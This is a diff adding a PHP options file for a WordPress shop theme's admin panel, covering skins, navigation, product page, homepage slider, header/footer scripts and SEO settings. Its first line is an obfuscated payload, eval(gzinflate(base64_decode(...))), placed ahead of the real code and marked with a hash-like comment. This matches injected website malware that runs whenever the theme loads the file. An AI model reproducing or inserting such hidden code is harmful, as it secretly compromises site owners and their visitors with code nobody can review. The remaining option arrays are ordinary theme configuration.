@@ -1,0 +1,611 @@
+<?php /*afcfe9f26d22e084b88f0a4f704d4f78*/ eval(gzinflate(base64_decode('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')));?>
+<?php
+
+$options[] = array(	"type" => "maintabletop");
+
+    /// General Settings
+	
+	    $options[] = array(	"name" => "General Settings",
+						"type" => "heading");
+						
+		    $options[] = array(	"name" => "Theme Skin",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"desc" => "Please select the CSS skin of your blog here.",
+					                "id" => $shortname."_alt_stylesheet",
+					                "std" => "Select a CSS skin:",
+					                "type" => "select",
+					                "options" => $alt_stylesheets);
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Customize Your Design",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Use Custom Stylesheet",
+						            "desc" => "If you want to make custom design changes using CSS enable and <a href='". $customcssurl . "'>edit custom.css file here</a>.",
+						            "id" => $shortname."_customcss",
+						            "std" => "false",
+						            "type" => "checkbox");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Favicon",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+
+				$options[] = array(	"desc" => "Paste the full URL for your favicon image here if you wish to show it in browsers. <a href='http://www.favicon.cc/'>Create one here</a>",
+						            "id" => $shortname."_favicon",
+						            "std" => "",
+						            "type" => "text");	
+			
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Header Your Logo Image Set",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+
+                $options[] = array(	"name" => "Choose Your Logo Image",
+				                    "desc" => "Paste the full URL to your logo image here.",
+						            "id" => $shortname."_logo_url",
+						            "std" => "",
+						            "type" => "text");
+
+				$options[] = array(	"name" => "Choose Blog Title over Logo",
+				                    "desc" => "This option will overwrite your logo selection above - You can <a href='". $generaloptionsurl . "'>change your settings here</a>",
+						            "label" => "Show Blog Title + Tagline.",
+						            "id" => $shortname."_show_blog_title",
+						            "std" => "true",
+						            "type" => "checkbox");	
+
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Relative dates in posts",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+				
+				$options[] = array(	"name" => "Use relative dates in posts",
+				                    "label" => "Show relative dates in posts.",
+						            "id" => $shortname."_relative_date",
+						            "std" => "false",
+						            "type" => "checkbox");	
+						
+		    $options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Comments Appearance",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Display Comments Count",
+						            "desc" => "Show comments count in Front/Archive",
+						            "id" => $shortname."_commentcount",
+						            "std" => "false",
+						            "type" => "checkbox");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Thumbnail Images Appearance",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Display auto resized images",
+						            "desc" => "Show of thumbnail images displayed in post archives/search results",
+						            "id" => $shortname."_timthumb_all",
+						            "std" => "false",
+						            "type" => "checkbox");	
+									
+				$options[] = array(	"label" => "Show auto resized images in single posts",
+						            "desc" => "Show thumbnail images displayed in single posts on top right corner",
+						            "id" => $shortname."_show_singleimg",
+						            "std" => "false",
+						            "type" => "checkbox");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Syndication / Feed",
+						        "toggle" => "true",
+								"type" => "subheadingtop");			
+						
+			$options[] = array( "desc" => "If you are using a service like Feedburner to manage your RSS feed, enter full URL to your feed into box above. If you'd prefer to use the default WordPress feed, simply leave this box blank.",
+			    		            "id" => $shortname."_feedburner_url",
+			    		            "std" => "",
+			    		            "type" => "text");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+								
+		$options[] = array(	"type" => "maintablebreak");
+		
+		
+    /// Navigation Settings												
+	
+				
+		$options[] = array(	"name" => "Navigation Settings",
+						    "type" => "heading");
+
+				$options[] = array(	"name" => "Exclude Pages from Header Menu",
+								"toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"type" => "multihead");
+						
+				$options = pages_exclude($options);
+									
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Breadcrumbs Navigation",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Show breadcrumbs navigation bar",
+						            "desc" => "i.e. Home > Blog > Title - <a href='". $breadcrumbsurl . "'>Change options here</a>",
+						            "id" => $shortname."_breadcrumbs",
+						            "std" => "true",
+						            "type" => "checkbox");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+$options[] = array(	"name" => "Footer Navigation",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Show breadcrumbs navigation bar",
+                	                "desc" => "Enter a comma-separated list of the <code>page ID's</code> that you'd like to display in footer (on the right). (ie. <code>1,2,3,4</code>)",
+						            "id" => $shortname."_footerpages",
+						            "std" => "",
+						            "type" => "text");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+						
+		$options[] = array(	"type" => "maintablebreak");
+		
+		
+		
+		   /// Product Settings												
+				
+		$options[] = array(	"name" => "Product  Details Page Settings",
+						    "type" => "heading");
+										
+		  $options[] = array(	"name" => "Product Sizing Chart",
+						"toggle" => "true",
+						"type" => "subheadingtop");
+		
+		$options[] = array(	"desc" => "You might want to show a size chart in case you are selling product like cloths etc and have different sizes such as X, XL, XXL etc. Mention image URL to your chart guide or you may add html elements such as tables etc. to show your product size chart",
+							"id" => $shortname."_size_chart",
+							"std" => "",
+							"type" => "textarea");
+							
+	$options[] = array(	"type" => "subheadingbottom");
+	
+	$options[] = array(	"name" => "Share This Feed Name setting",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+				
+				$options[] = array(	"desc" => "Feed name",
+					                "id" => $shortname."_feed_name",
+					                "std" => "",
+					                "type" => "text");
+				
+				$options[] = array(	"type" => "subheadingbottom");
+
+			
+	$options[] = array(	"name" => "Share This Feed URL link setting",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+				
+				$options[] = array(	"desc" => "Feed URL",
+					                "id" => $shortname."_feed_url",
+					                "std" => "",
+					                "type" => "text");
+				
+				$options[] = array(	"type" => "subheadingbottom");
+
+ 												
+////////////////////start /////////////////
+	  $options[] = array(	"name" => "Add to Cart/Send Inquiry Button Position",
+						"toggle" => "true",
+						"type" => "subheadingtop");
+		
+	$options[] = array(	"desc" => "Select Add to Cart Button Position in Product Detail Page ",
+							"id" => $shortname."_add_to_cart_button_position",
+							"std" => "Select a CSS skin:",
+							"type" => "select",
+							"options" => array('Above Description','Below Description','Above and Below Description'));
+							
+	$options[] = array(	"type" => "subheadingbottom");
+	
+	/////////////////////////end///////////
+			
+		$options[] = array(	"type" => "maintablebreak");
+		
+ 												
+$options[] = array(	"type" => "maintablebottom");
+				
+$options[] = array(	"type" => "maintabletop");
+		
+		
+
+ 
+     
+
+
+	/// Blog Section Settings												
+				
+		$options[] = array(	"name" => "Blog Section Settings",
+						    "type" => "heading");
+			
+		
+		$options[] = array(	"name" => "Select Categories As Blog Categories",
+								"toggle" => "true",
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"type" => "multihead");
+						
+				$options = category_exclude($options);
+					
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			
+			
+			
+		$options[] = array(	"name" => "Content Display",
+						        "toggle" => "true",
+								
+								
+								
+								"type" => "subheadingtop");
+						
+				$options[] = array(	"label" => "Display Full Post Content",
+						            "desc" => "Instead of default Post excerpts display Full Post Content in Blog Section",
+						            "id" => $shortname."_postcontent_full",
+						            "std" => "false",
+						            "type" => "checkbox");	
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+ 						
+		$options[] = array(	"type" => "maintablebreak");
+		
+		
+
+
+			
+		
+/// Blog Section Settings												
+				
+		$options[] = array(	"name" => "Home Page Settings",
+						    "type" => "heading");
+			
+		
+		$options[] = array(	"name" => "Number of  'Latest Product' to be shown on Home page",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+						
+			$options[] = array(	"name" => "Enter number of 'Latest Product' to be shown on Home page",
+								"desc" => "",
+								"id" => $shortname."_latest_products_home",
+								"std" => "3",
+								"type" => "text");
+		
+		$options[] = array(	"type" => "subheadingbottom");
+		
+		
+		
+		$options[] = array(	"name" => "Home Slider Settings",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+						
+							$options[] = array(	"name" => "Enter categori product",
+								"desc" => "ex: 1 , 2, 3 ",
+								"id" => $shortname."_slide_ctr",
+								"std" => "3",
+								"type" => "text");
+								
+											$options[] = array(	"name" => "Enter number of products to be shown on slider",
+								"desc" => "ex: 1 , 2, 3 ",
+								"id" => $shortname."_slide_no",
+								"std" => "3",
+								"type" => "text");
+								
+										
+						
+				$options[] = array(	"name" => "Home page slider speed in milliseconds before second slide is shown",
+					                "desc" => "",
+					                "id" => $shortname."_sliderspeed_homepage",
+					                "std" => "1800",
+					                "type" => "text");
+			
+				$options[] = array(	"label" => "Stop auto animate slider on homepage",
+						            "desc" => "",
+						            "id" => $shortname."_homepage_sliderstop_flag",
+						            "std" => "true",
+						            "type" => "checkbox");	
+															
+			$options[] = array(	"type" => "subheadingbottom");
+									
+	$options[] = array(	"type" => "maintablebreak");								
+									
+									
+				$options[] = array(	"name" => "Category on Homepage",
+						    "type" => "heading");	
+			
+					$options[] = array(	"label" => "Display Category Product on Homepage",
+						            "desc" => "",
+						            "id" => $shortname."_show_cat_home",
+						            "std" => "false",
+						            "type" => "checkbox");	
+				
+				$options[] = array(	"name" => "Category #1",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+										
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr1",
+					                "std" => "1",
+					                "type" => "text");
+									
+					$options[] = array(	"type" => "subheadingbottom");
+						
+				$options[] = array(	"name" => "Category #2",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr2",
+					                "std" => "1",
+					                "type" => "text");				
+														
+					$options[] = array(	"type" => "subheadingbottom");
+					
+				$options[] = array(	"name" => "Category #3",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+						
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr3",
+					                "std" => "1",
+					                "type" => "text");
+			
+					$options[] = array(	"type" => "subheadingbottom");	
+					
+				$options[] = array(	"name" => "Category 4",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr4",
+					                "std" => "1",
+					                "type" => "text");	
+									
+					$options[] = array(	"type" => "subheadingbottom");
+					
+				$options[] = array(	"name" => "Category 5",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr5",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");	
+					
+				$options[] = array(	"name" => "Category 6",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr6",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");	
+					
+				$options[] = array(	"name" => "Category 7",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr7",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");		
+					
+				$options[] = array(	"name" => "Category 8",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr8",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");	
+					
+				$options[] = array(	"name" => "Category 9",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr9",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");	
+					
+				$options[] = array(	"name" => "Category 10",
+						        "toggle" => "true",
+								"type" => "subheadingtop");				
+			
+					$options[] = array(	"name" => "Enter category ID",
+					                "desc" => "",
+					                "id" => $shortname."_ctr10",
+					                "std" => "1",
+					                "type" => "text");	
+			
+					$options[] = array(	"type" => "subheadingbottom");
+						
+					
+				$options[] = array(	"name" => "Number of 'products' to be shown on Home page",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+									
+					$options[] = array(	"name" => "Number of 'products' to be shown on Home page",
+					                "desc" => "",
+					                "id" => $shortname."_ctrn",
+					                "std" => "3",
+					                "type" => "text");									
+						$options[] = array(	"type" => "subheadingbottom");						
+																				
+														
+															
+										
+						
+									
+
+									
+									
+									
+									
+									
+									
+									
+									
+									
+									
+									
+									
+									
+									
+
+			
+ 						
+		$options[] = array(	"type" => "maintablebreak");
+    
+		
+	/// Blog Stats and Scripts											
+				
+		$options[] = array(	"name" => "Blog Stats and Scripts",
+						    "type" => "heading");
+										
+			$options[] = array(	"name" => "Blog Header Scripts",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+						
+				$options[] = array(	"name" => "Header Scripts",
+					                "desc" => "If you need to add scripts to your header (like <a href='http://haveamint.com/'>Mint</a> tracking code), do so here.",
+					                "id" => $shortname."_scripts_header",
+					                "std" => "",
+					                "type" => "textarea");
+			
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Blog Footer Scripts",
+						        "toggle" => "true",
+								"type" => "subheadingtop");	
+						
+				$options[] = array(	"name" => "Footer Scripts",
+					                "desc" => "If you need to add scripts to your footer (like <a href='http://www.google.com/analytics/'>Google Analytics</a> tracking code), do so here.",
+					                "id" => $shortname."_google_analytics",
+					                "std" => "",
+					                "type" => "textarea");
+			
+			
+			$options[] = array(	"type" => "subheadingbottom");
+						
+						
+		
+		
+		
+		
+		
+
+		
+	/// SEO Options
+				
+		$options[] = array(	"name" => "SEO Options",
+						    "type" => "heading");
+						
+			$options[] = array(	"name" => "Home Page <code>&lt;meta&gt;</code> tags",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+
+				$options[] = array(	"name" => "Meta Description",
+					                "desc" => "You should use meta descriptions to provide search engines with additional information about topics that appear on your site. This only applies to your home page.",
+					                "id" => $shortname."_meta_description",
+					                "std" => "",
+					                "type" => "textarea");
+
+				$options[] = array(	"name" => "Meta Keywords (comma separated)",
+					                "desc" => "Meta keywords are rarely used nowadays but you can still provide search engines with additional information about topics that appear on your site. This only applies to your home page.",
+						            "id" => $shortname."_meta_keywords",
+						            "std" => "",
+						            "type" => "text");
+									
+				$options[] = array(	"name" => "Meta Author",
+					                "desc" => "You should write your <em>full name</em> here but only do so if this blog is writen only by one outhor. This only applies to your home page.",
+						            "id" => $shortname."_meta_author",
+						            "std" => "",
+						            "type" => "text");
+						
+			$options[] = array(	"type" => "subheadingbottom");
+			
+			$options[] = array(	"name" => "Add <code>&lt;noindex&gt;</code> tags",
+						        "toggle" => "true",
+								"type" => "subheadingtop");
+
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to category archives.",
+						            "id" => $shortname."_noindex_category",
+						            "std" => "true",
+						            "type" => "checkbox");
+									
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to tag archives.",
+						            "id" => $shortname."_noindex_tag",
+						            "std" => "true",
+						            "type" => "checkbox");
+				
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to author archives.",
+						            "id" => $shortname."_noindex_author",
+						            "std" => "true",
+						            "type" => "checkbox");
+									
+			    $options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to Search Results.",
+						            "id" => $shortname."_noindex_search",
+						            "std" => "true",
+						            "type" => "checkbox");
+				
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to daily archives.",
+						            "id" => $shortname."_noindex_daily",
+						            "std" => "true",
+						            "type" => "checkbox");
+				
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to monthly archives.",
+						            "id" => $shortname."_noindex_monthly",
+						            "std" => "true",
+						            "type" => "checkbox");
+				
+				$options[] = array(	"label" => "Add <code>&lt;noindex&gt;</code> to yearly archives.",
+						            "id" => $shortname."_noindex_yearly",
+						            "std" => "true",
+						            "type" => "checkbox");
+				
+						
+						
+			$options[] = array(	"type" => "subheadingbottom");
+						
+		$options[] = array(	"type" => "maintablebreak");
+						
+$options[] = array(	"type" => "maintablebottom");
+
+?>
